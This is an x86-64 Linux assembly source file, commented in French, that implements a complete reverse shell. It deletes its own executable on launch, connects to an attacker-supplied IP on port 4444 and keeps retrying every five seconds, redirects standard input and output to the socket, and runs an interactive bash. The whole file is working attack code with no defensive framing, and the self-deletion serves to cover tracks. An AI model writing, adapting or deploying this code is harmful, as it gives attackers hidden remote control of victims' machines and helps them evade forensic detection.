section .data
    ; Commandes et arguments
    command      db '/bin/bash',0
    bash_i       db '-i',0
    bash_args    dq command, bash_i, 0
    term_env     db 'TERM=xterm',0
    env_vars     dq term_env, 0
    
    ; Messages d'erreur
    err_usage    db 'Usage: ./reverse <attacker_ip>',10,0
    err_ip_format db 'Error: Invalid IP format',10,0
    err_socket   db 'Error: Socket creation failed',10,0
    err_connect  db 'Error: Connection failed',10,0
    timespec     dq 5, 0          ; 5 secondes entre les tentatives
    
    ; Chemins système
    self_path    db '/proc/self/exe',0
    port_str     db '4444',0       ; Port fixe

section .bss
    ip_bytes     resd 1           ; IP en format réseau
    port_bytes   resw 1           ; Port en format réseau
    self_exe     resb 256         ; Buffer pour le chemin de l'exécutable

section .text
    global _start

;----------------------------------------------------------
; Auto-suppression silencieuse
;----------------------------------------------------------
self_destruct:
    mov rax, 89                   ; sys_readlink
    mov rdi, self_path
    mov rsi, self_exe
    mov rdx, 256
    syscall
    
    test rax, rax
    js .finish                    ; Ignorer si erreur
    
    mov rdi, self_exe             ; Ajouter NULL terminal
    add rdi, rax
    mov byte [rdi], 0
    
    mov rax, 87                   ; sys_unlink
    mov rdi, self_exe
    syscall

.finish:
    ret

;----------------------------------------------------------
; Validation et conversion de l'IP
; Entrée : rdi = pointeur vers la chaîne IP
; Sortie : rax = 1 (succès), 0 (erreur)
;----------------------------------------------------------
validate_and_parse_ip:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    
    mov rsi, rdi
    xor rbx, rbx                  ; Compteur d'octets
    xor r12d, r12d                ; IP accumulée
    xor eax, eax                  ; Valeur d'octet courante

.parse_loop:
    movzx edx, byte [rsi]
    test dl, dl
    jz .end_parse
    
    cmp dl, '.'
    je .store_octet
    
    cmp dl, '0'
    jb .invalid
    cmp dl, '9'
    ja .invalid
    
    sub dl, '0'
    imul eax, 10
    add eax, edx
    cmp eax, 255
    ja .invalid
    
    inc rsi
    jmp .parse_loop

.store_octet:
    cmp bl, 3                     ; Vérifier nombre d'octets
    jae .invalid
    
    shl r12d, 8
    or r12d, eax
    inc bl
    xor eax, eax
    inc rsi
    jmp .parse_loop

.end_parse:
    cmp bl, 3                     ; Doit avoir 4 octets
    jne .invalid
    
    shl r12d, 8
    or r12d, eax
    bswap r12d                    ; Convertir en big-endian
    mov [ip_bytes], r12d
    mov rax, 1
    jmp .done

.invalid:
    xor rax, rax
.done:
    pop r12
    pop rbx
    pop rbp
    ret

;----------------------------------------------------------
; Validation et conversion du port (fixé à 4444)
;----------------------------------------------------------
validate_port:
    mov rsi, port_str
    xor rax, rax
    xor rcx, rcx                  ; Compteur de chiffres

.convert_loop:
    movzx edx, byte [rsi]
    test dl, dl
    jz .check_value
    
    cmp dl, '0'
    jb .invalid
    cmp dl, '9'
    ja .invalid
    
    sub dl, '0'
    imul rax, 10
    add rax, rdx
    cmp rax, 65535
    ja .invalid
    inc rsi
    inc rcx
    jmp .convert_loop

.check_value:
    test rcx, rcx                 ; Vérifier au moins 1 chiffre
    jz .invalid
    
    cmp rax, 4444                 ; Port doit être 4444
    jne .invalid
    
    xchg al, ah                   ; Convertir en big-endian
    mov [port_bytes], ax
    mov rax, 1
    ret

.invalid:
    xor rax, rax
    ret

;----------------------------------------------------------
; Programme principal
;----------------------------------------------------------
_start:
    call self_destruct            ; Auto-suppression
    
    pop rcx                       ; argc
    cmp rcx, 2
    jne usage_error
    
    pop rsi                       ; argv[0]
    pop rdi                       ; argv[1] (IP)
    
    call validate_and_parse_ip
    test rax, rax
    jz ip_error
    
    call validate_port
    test rax, rax
    jz port_error

connection_loop:
    ; Création du socket
    mov rax, 41                   ; sys_socket
    mov rdi, 2                    ; AF_INET
    mov rsi, 1                    ; SOCK_STREAM
    xor rdx, rdx                  ; Protocole par défaut
    syscall 
    
    test rax, rax
    js socket_error
    mov r8, rax                   ; Sauvegarder le socket fd

    ; Configuration de la structure sockaddr_in
    sub rsp, 16
    mov word [rsp], 2             ; AF_INET
    mov ax, [port_bytes]
    mov word [rsp+2], ax          ; Port
    mov eax, [ip_bytes]
    mov dword [rsp+4], eax        ; IP
    mov qword [rsp+8], 0          ; Padding

    ; Connexion
    mov rax, 42                   ; sys_connect
    mov rdi, r8                   ; socket fd
    mov rsi, rsp                  ; sockaddr_in
    mov rdx, 16                   ; addrlen
    syscall
    add rsp, 16
    
    test rax, rax
    js connect_error

    ; Redirection des flux standard
    xor rsi, rsi                  ; Descripteur cible
.dup_loop:
    mov rax, 33                   ; sys_dup2
    mov rdi, r8                   ; Source (socket)
    syscall
    inc rsi
    cmp rsi, 3                    ; 0=stdin, 1=stdout, 2=stderr
    jne .dup_loop

    ; Exécution du shell interactif
    mov rax, 59                   ; sys_execve
    lea rdi, [command]            ; /bin/bash
    lea rsi, [bash_args]          ; ["/bin/bash", "-i"]
    lea rdx, [env_vars]           ; ["TERM=xterm"]
    syscall

    ; En cas d'échec d'execve
    jmp exit_program

;----------------------------------------------------------
; Gestion des erreurs
;----------------------------------------------------------
usage_error:
    mov rax, 1
    mov rdi, 2
    lea rsi, [err_usage]
    mov rdx, 30
    syscall
    jmp exit_program

ip_error:
    mov rax, 1
    mov rdi, 2
    lea rsi, [err_ip_format]
    mov rdx, 25
    syscall
    jmp exit_program

port_error:
    mov rdi, 1
    jmp exit_program

socket_error:
    mov rax, 1
    mov rdi, 2
    lea rsi, [err_socket]
    mov rdx, 28
    syscall
    jmp exit_program
connect_error:
    mov rax, 3                    ; sys_close
    mov rdi, r8
    syscall
    
    mov rax, 35                   ; sys_nanosleep
    lea rdi, [timespec]
    xor rsi, rsi
    syscall
    jmp connection_loop           ; Réessayer

exit_program:
    mov rax, 60                   ; sys_exit
    mov rdi, 1
    syscall

